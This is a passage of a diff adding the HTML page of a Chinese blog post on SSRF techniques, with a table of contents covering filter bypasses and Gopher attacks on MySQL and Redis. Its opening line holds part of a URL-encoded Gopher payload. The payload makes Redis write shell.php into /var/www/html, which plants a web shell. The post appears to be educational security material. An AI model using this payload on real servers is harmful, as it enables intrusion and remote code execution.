class="number">2413</span>%<span class="number">0</span>D%<span class="number">0</span>A/var/www/html%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A4%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2410</span>%<span class="number">0</span>D%<span class="number">0</span>Adbfilename%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">249</span>%<span class="number">0</span>D%<span class="number">0</span>Ashell.php%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">244</span>%<span class="number">0</span>D%<span class="number">0</span>Asave%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>A</span><br><span class="line"><span class="comment"># 不需要二次url加密</span></span><br></pre></td></tr></table></figure>
+
+
+    <p><img src="" loading="lazy"></p>
+
+  </article>
+
+  
+      
+    <div class="nexmoe-post-copyright">
+        <strong>本文作者：</strong>SourceRev<br>
+        <strong>本文链接：</strong><a href="http://sourcerev.github.io/2023/01/09/SSRF1/" title="http:&#x2F;&#x2F;sourcerev.github.io&#x2F;2023&#x2F;01&#x2F;09&#x2F;SSRF1&#x2F;" target="_blank" rel="noopener">http:&#x2F;&#x2F;sourcerev.github.io&#x2F;2023&#x2F;01&#x2F;09&#x2F;SSRF1&#x2F;</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+
+        
+    </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/SSRF/" rel="tag">SSRF</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/web/" rel="tag">web</a>
+    
+</div>
+  
+  
+    <script async src="/js/copy-codeblock.js?v=1681305066654"></script>
+  
+
+  
+      <div class="nexmoe-post-footer">
+          <br><a>这是一个假的评论区</a>
+
+      </div>
+  
+</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
+        <div class="nexmoe-tool">
+
+            
+
+            
+            
+            <button class="mdui-fab catalog" style="overflow:unset;">
+                <i class="nexmoefont icon-i-catalog"></i>
+                <div class="nexmoe-toc">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-number">1.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.</span> <span class="toc-text">关键字绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="toc-number">1.2.</span> <span class="toc-text">长度限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E9%AA%8C%E8%AF%81%E5%99%A8"><span class="toc-number">1.3.</span> <span class="toc-text">绕过验证器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gopher%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.4.</span> <span class="toc-text">Gopher协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E6%97%A0%E5%AF%86%E7%A0%81%E7%9A%84mysql"><span class="toc-number">1.4.1.</span> <span class="toc-text">打无密码的mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BBredits"><span class="toc-number">1.4.2.</span> <span class="toc-text">攻击redits</span></a></li></ol></li></ol></li></ol>
+                </div>
+            </button>
+            
+
+            
+
+            <a href="#nexmoe-content" class="toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+        </div>
+    </div>
+</div></div><div id="nexmoe-footer"><!--!--></div><div><div id="nexmoe-search-space">
+	<div class="search-container">
+		<div class="search-header">
+			<div class="search-input-container">
+				<input
+					class="search-input"
+					type="text"
+					placeholder="搜索"
+					oninput="sinput();"
+				/>
+			</div>
+			<a class="search-close" onclick="sclose();">×</a>
+		</div>
+		<div class="search-body"></div>
+	</div>
+</div>
+</div><div><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+</div></body></html>
